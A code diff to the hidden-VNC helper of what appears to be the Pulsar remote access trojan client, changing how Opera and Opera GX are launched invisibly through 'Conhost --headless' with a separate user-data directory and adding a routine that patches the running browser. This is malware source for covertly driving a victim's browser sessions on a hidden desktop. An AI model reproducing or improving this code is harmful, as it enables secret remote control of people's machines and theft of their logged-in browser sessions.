@@ -5,6 +5,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -183,15 +184,24 @@ namespace Pulsar.Client.Helper.HVNC
                     return;
                 }
 
-                string startCommand = "Conhost --headless cmd.exe /c start opera.exe --user-data-dir=\"" + text + "\"";
+                string operaEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera\\opera.exe";
+
+                string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
                 this.CreateProc(startCommand);
+
+                // wait 2 seconds then patch (it's startup up anyway doesn't matter)
+                Thread.Sleep(2000);
+                Task.Run(async () =>
+                {
+                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                });
             }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting Opera: " + ex.Message);
             }
         }
-
+        
         public void StartOperaGX()
         {
             try
@@ -216,8 +226,17 @@ namespace Pulsar.Client.Helper.HVNC
                     return;
                 }
 
-                string startCommand = "Conhost --headless cmd.exe /c start operagx.exe --user-data-dir=\"" + text + "\"";
+                string operaGXEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera GX\\opera.exe";
+
+                string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaGXEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
+                Debug.WriteLine(startCommand);
                 this.CreateProc(startCommand);
+
+                Thread.Sleep(2000);
+                Task.Run(async () =>
+                {
+                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                });
             }
             catch (Exception ex)
             {
